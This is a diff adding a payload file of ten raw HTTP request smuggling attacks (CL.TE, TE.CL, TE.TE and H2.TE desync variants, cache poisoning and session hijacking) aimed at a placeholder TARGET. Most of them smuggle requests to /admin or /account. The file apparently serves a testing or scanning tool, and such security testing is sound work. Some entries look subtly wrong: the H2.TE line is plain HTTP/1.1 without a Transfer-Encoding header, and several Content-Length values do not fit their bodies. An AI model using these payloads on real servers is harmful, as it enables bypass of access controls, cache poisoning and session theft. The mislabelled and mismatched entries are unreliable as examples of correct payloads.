@@ -1,0 +1,12 @@
+# HTTP Request Smuggling Payloads
+# Format: TYPE|PAYLOAD
+
+CL.TE|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nX-Ignore: X
+CL.TE|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGET /admin HTTP/1.1\r\n\r\n0
+TE.CL|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n17\r\nGET /admin HTTP/1.1\r\n\r\n0
+TE.CL|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1
+TE.TE|POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET
+TE.TE|POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding:\r\n chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET
+H2.TE|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nFoo: bar
+CACHE_POISON|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 43\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /poisoned HTTP/1.1\r\nHost: TARGET\r\nX-Cache: poisoned
+SESSION_HIJACK|POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /account HTTP/1.1\r\nHost: TARGET\r\nCookie: session=stolen_session_id
